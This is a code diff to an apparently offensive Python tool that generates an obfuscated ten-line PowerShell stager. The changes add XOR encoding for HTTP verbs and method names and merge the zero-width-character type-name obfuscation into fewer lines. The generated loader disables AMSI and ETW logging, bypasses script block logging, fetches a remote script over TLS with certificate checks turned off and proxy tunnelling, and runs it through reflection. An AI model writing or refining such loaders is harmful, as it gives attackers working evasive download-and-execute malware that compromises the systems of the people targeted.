@@ -1525,19 +1525,20 @@ def _stager_clr_inline(
 
 # ── 10-line execution loader ──────────────────────────────────────────────────
 #
-# Exactly 10 lines.  Single shared XOR key encodes every string — no type name,
-# no URL, no SMA identifier appears in plaintext.
+# Exactly 10 lines.  Single shared XOR key encodes field names, URL, UA, and
+# HTTP verbs — no type name, verb, or identifier appears in plaintext.
+# 7 ZWSP setups are merged into 2 lines (4+3) instead of one line each.
 #
-#   L1  — shared key + decoder sb + Assembly ref + SBL bypass + AMSI bypass
-#   L2  — URL decode + URI parse (host / port / path)
-#   L3  — proxy detection via WebClient (system proxy + default credentials)
-#   L4  — TCP connect target (proxy-aware) + TcpClient + stream
-#   L5  — CONNECT tunnel to target host (only runs when proxy detected)
-#   L6  — SslStream + AuthenticateAsClient (TLS version randomised per build)
-#   L7  — GET request write
-#   L8  — response read + close
-#   L9  — HTTP header strip + UTF-8 body extraction
-#   L10 — ScriptBlock type via reflection (no [scriptblock]::Create) + invoke
+#   L1  — ZWSP type-name setups: ETW, AMSI, WebClient, TcpClient
+#   L2  — ZWSP type-name setups: SslStream, MemoryStream, ScriptBlock
+#   L3  — key + decoder sb + Assembly ref + SBL bypass + AMSI bypass
+#   L4  — URL decode + URI parse (host / port / path)
+#   L5  — proxy detection via WebClient (system proxy + default credentials)
+#   L6  — TCP connect target (proxy-aware) + TcpClient + stream
+#   L7  — CONNECT tunnel to target host (only runs when proxy detected)
+#   L8  — SslStream + TLS auth + GET request write
+#   L9  — response read + close + header strip + UTF-8 body extraction
+#   L10 — ScriptBlock type via reflection (method name XOR'd) + invoke
 
 def _compact_exec_loader(stager_url: str) -> list[str]:
     k      = random.randint(15, 110)
@@ -1546,7 +1547,6 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
     def enc(s: str) -> str:
         return ",".join(str(ord(c) ^ k) for c in s)
 
-    # variable names — all generated before the d() helper that closes over vd
     vk      = _rv(); vd  = _rv(); va   = _rv()
     vurl    = _rv(); vh  = _rv(); vp   = _rv(); vq   = _rv()
     vwc     = _rv(); vpx = _rv(); vpu  = _rv(); vup  = _rv()
@@ -1560,14 +1560,11 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
     vsc  = _rv()
 
     def d(e: str) -> str:
-        """PS expression: call $vd decoder with encoded byte array."""
         return f"(&{vd} @({e}))"
 
     tls_val = random.choice([3072, 12288, 15360])
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
 
-    # Invisible Unicode obfuscation for all .NET type names — ZWSP/VS/PUA chars
-    # stripped at runtime via -replace "[^\x00-\x7F]","" before type resolution
     etw_z,  vetw  = _zwsp_type("System.Management.Automation.PSEtwLogProvider")
     amsi_z, vamsi = _zwsp_type("System.Management.Automation.AmsiUtils")
     wc_z,   vwct  = _zwsp_type("Net.WebClient")
@@ -1576,19 +1573,25 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
     ms_z,   vmst  = _zwsp_type("IO.MemoryStream")
     sb_z,   vsbt  = _zwsp_type("System.Management.Automation.ScriptBlock")
 
-    # XOR-encode only short non-type strings (field names, URL, UA)
     e_men  = enc("m_enabled")
     e_aif  = enc("amsiInitFailed")
     e_url  = enc(stager_url)
     e_ua   = enc(ua)
+    e_get  = enc("GET ")
+    e_con  = enc("CONNECT ")
+    e_crt  = enc("Create")
 
-    # PS decoder scriptblock: {param($b)([byte[]]$b|%{[char]($_-bxor $KEY)})-join''}
     dec_body = f"{{param($b)([byte[]]$b|%{{[char]($_-bxor {vk})}})-join''}}"
 
-    # Prepend ZWSP/VS/PUA type-name setup lines
-    lines = [etw_z, amsi_z, wc_z, tcp_z, ssl_z, ms_z, sb_z]
+    lines = []
 
-    # L1: key + decoder + Assembly ref + SBL bypass (try/catch) + AMSI bypass (try/catch)
+    # L1: 4 ZWSP type-name setups merged on one line
+    lines.append(f"{etw_z};{amsi_z};{wc_z};{tcp_z}")
+
+    # L2: 3 ZWSP type-name setups merged on one line
+    lines.append(f"{ssl_z};{ms_z};{sb_z}")
+
+    # L3: key + decoder + Assembly ref + SBL bypass + AMSI bypass
     lines.append(
         f"{vk}={k};"
         f"{vd}={dec_body};"
@@ -1597,7 +1600,7 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
         f"try{{{va}.GetType({vamsi}).GetField({d(e_aif)},({bf_xor} -bxor {vk})).SetValue($null,$true)}}catch{{}}"
     )
 
-    # L2: URL decode + URI components
+    # L4: URL decode + URI components
     lines.append(
         f"{vurl}={d(e_url)};"
         f"{vh}=([Uri]{vurl}).Host;"
@@ -1605,7 +1608,7 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
         f"{vq}=([Uri]{vurl}).PathAndQuery"
     )
 
-    # L3: proxy detection via WebClient (ZWSP-obfuscated type name, Windows integrated auth)
+    # L5: proxy detection via WebClient (ZWSP type name, Windows integrated auth)
     lines.append(
         f"{vwc}=New-Object {vwct};"
         f"{vwc}.UseDefaultCredentials=$true;"
@@ -1614,7 +1617,7 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
         f"{vup}=({vpu}.Host -ne {vh} -or {vpu}.Port -ne {vp})"
     )
 
-    # L4: compute TCP connect target (direct or via proxy) + connect + get stream
+    # L6: TCP connect target (direct or via proxy) + connect + stream
     lines.append(
         f"{vch}=if({vup}){{{vpu}.Host}}else{{{vh}}};"
         f"{vcp}=if({vup}){{{vpu}.Port}}else{{[int]{vp}}};"
@@ -1622,42 +1625,33 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
         f"{vns}={vtcp}.GetStream()"
     )
 
-    # L5: CONNECT tunnel (only executes when proxy path taken)
+    # L7: CONNECT tunnel (only executes when proxy path taken)
     lines.append(
-        f"if({vup}){{{vconn}=[Text.Encoding]::ASCII.GetBytes('CONNECT '+{vh}+':'+{vp}+\" HTTP/1.1`r`nHost: \"+{vh}+':'+{vp}+\"`r`nProxy-Connection: Keep-Alive`r`n`r`n\");"
+        f"if({vup}){{{vconn}=[Text.Encoding]::ASCII.GetBytes({d(e_con)}+{vh}+':'+{vp}+\" HTTP/1.1`r`nHost: \"+{vh}+':'+{vp}+\"`r`nProxy-Connection: Keep-Alive`r`n`r`n\");"
         f"{vns}.Write({vconn},0,{vconn}.Length);"
         f"{vrbuf}=New-Object byte[] 512;{vns}.Read({vrbuf},0,512)|Out-Null}}"
     )
 
-    # L6: SslStream + authenticate (TLS version random per build)
-    # PS coerces {$true} scriptblock to RemoteCertificateValidationCallback via constructor overload resolution
+    # L8: SslStream + TLS auth + GET request + write (merged)
     lines.append(
         f"{vssl}=New-Object {vsslt} -ArgumentList {vns},$false,{{$true}};"
-        f"{vssl}.AuthenticateAsClient({vh},$null,{tls_val},$false)"
-    )
-
-    # L7: GET request + write
-    lines.append(
-        f"{vreq}=[Text.Encoding]::ASCII.GetBytes('GET '+{vq}+\" HTTP/1.1`r`nHost: \"+{vh}+\"`r`nUser-Agent: \"+{d(e_ua)}+\"`r`nAccept: */*`r`nConnection: close`r`n`r`n\");"
+        f"{vssl}.AuthenticateAsClient({vh},$null,{tls_val},$false);"
+        f"{vreq}=[Text.Encoding]::ASCII.GetBytes({d(e_get)}+{vq}+\" HTTP/1.1`r`nHost: \"+{vh}+\"`r`nUser-Agent: \"+{d(e_ua)}+\"`r`nAccept: */*`r`nConnection: close`r`n`r`n\");"
         f"{vssl}.Write({vreq},0,{vreq}.Length)"
     )
 
-    # L8: read full response + close
+    # L9: read full response + close + header strip + body extraction (merged)
     lines.append(
         f"{vms}=New-Object {vmst};{vbuf}=New-Object byte[] 4096;{vn}=1;"
         f"while({vn} -gt 0){{{vn}={vssl}.Read({vbuf},0,{vbuf}.Length);if({vn} -gt 0){{{vms}.Write({vbuf},0,{vn})}}}};"
-        f"{vra}={vms}.ToArray();{vssl}.Close();{vtcp}.Close()"
-    )
-
-    # L9: strip HTTP response headers + extract body as string
-    lines.append(
+        f"{vra}={vms}.ToArray();{vssl}.Close();{vtcp}.Close();"
         f"{vhi}=0;for({vi}=0;{vi} -lt {vra}.Length-3;{vi}++){{if({vra}[{vi}] -eq 13 -and {vra}[{vi}+1] -eq 10 -and {vra}[{vi}+2] -eq 13 -and {vra}[{vi}+3] -eq 10){{{vhi}={vi}+4;break}}}};"
         f"{vbody}=[Text.Encoding]::UTF8.GetString({vra},{vhi},{vra}.Length-{vhi})"
     )
 
-    # L10: ScriptBlock via reflection (no [scriptblock]::Create in plaintext) + invoke
+    # L10: ScriptBlock via reflection (method name XOR-encoded) + invoke
     lines.append(
-        f"{vsc}={va}.GetType({vsbt}).GetMethod('Create',[type[]]([string])).Invoke($null,@({vbody}));"
+        f"{vsc}={va}.GetType({vsbt}).GetMethod({d(e_crt)},[type[]]([string])).Invoke($null,@({vbody}));"
         f"& {vsc}"
     )
 
